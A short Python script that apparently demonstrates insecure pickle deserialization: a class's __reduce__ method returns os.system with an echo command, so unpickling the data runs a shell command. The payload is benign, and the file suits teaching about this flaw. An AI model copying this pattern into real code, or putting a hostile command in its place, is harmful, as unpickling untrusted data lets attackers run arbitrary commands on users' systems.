import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

print("Pickling VulnerableClass object...")
pickled_data = pickle.dumps(VulnerableClass())

print("Unpickling pickled data...")
unpickled_object = pickle.loads(pickled_data)
